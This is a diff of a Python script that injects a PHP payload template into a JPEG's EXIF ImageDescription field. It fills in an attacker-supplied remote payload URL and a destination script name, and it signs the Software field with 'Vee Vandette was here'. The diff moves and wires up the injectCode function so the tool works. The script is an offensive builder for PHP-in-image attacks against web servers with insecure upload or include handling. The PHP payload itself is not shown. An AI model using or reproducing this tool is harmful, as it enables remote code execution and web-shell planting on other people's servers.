@@ -1,10 +1,19 @@
 #!/usr/bin/python3
 
-#TODO: Decoder
-#TODO: create method for assisting in encoding remote payload.
-
 from PIL import Image
 import piexif, sys, getopt, codecs
+
+def injectCode(image, outpout, payload, destination):
+    with open('imagePayload.php', 'r') as file:
+        data = file.read().replace('\n', '')
+    img = Image.open(image)
+    exif_dict = piexif.load(img.info["exif"])
+    exif_dict['0th'][piexif.ImageIFD.Software] = ("Vee Vandette was here")
+    payloadInjection = data.replace("payloadURL", payload)
+    finalOutput = payloadInjection.replace("destinationName", destination)
+    exif_dict['0th'][piexif.ImageIFD.ImageDescription] = (finalOutput)
+    exif_bytes = piexif.dump(exif_dict)
+    img.save(outpout, "jpeg", exif=exif_bytes)
 
 def main(argv):
     inputimage = ''
@@ -36,18 +45,10 @@ def main(argv):
     print('Payload URL is "', payloadurl)
     print('Destination Script Name is "', destinationname)
 
+    injectCode(inputimage, outputimage, payloadurl, destinationname)
+
 if __name__ == "__main__":
     main(sys.argv[1:])
 
-def injectCode(image, outpout, payload, destination):
-    with open('imagePayload.php', 'r') as file:
-        data = file.read().replace('\n', '')
-    img = Image.open(image)
-    exif_dict = piexif.load(img.info["exif"])
-    exif_dict['0th'][piexif.ImageIFD.Software] = ("Vee Vandette was here")
-    payloadInjection = data.replace("payloadURL", payload)
-    finalOutput = payloadInjection.replace("destinationName", destination)
-    exif_dict['0th'][piexif.ImageIFD.ImageDescription] = (finalOutput)
-    exif_bytes = piexif.dump(exif_dict)
-    img.save(outpout, "jpeg", exif=exif_bytes)
+
 
